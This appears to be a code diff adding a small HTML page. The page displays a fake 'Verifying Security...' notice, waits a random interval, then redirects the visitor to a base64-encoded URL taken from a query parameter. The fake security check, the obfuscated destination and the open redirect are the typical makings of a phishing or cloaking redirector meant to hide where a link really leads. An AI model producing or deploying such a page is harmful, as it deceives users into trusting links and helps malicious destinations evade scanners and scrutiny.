@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+    // Random delay then redirect
+    setTimeout(() => {
+        const params = new URLSearchParams(location.search);
+        const encoded = params.get('t');
+        try {
+            window.location.href = atob(encoded);
+        } catch {
+            window.location.href = '/';
+        }
+    }, Math.random() * 1500 + 500);
+    </script>
+</head>
+<body>
+    <h2 style="text-align:center;margin:50px">🔒 Verifying Security...</h2>
+</body>
+</html>
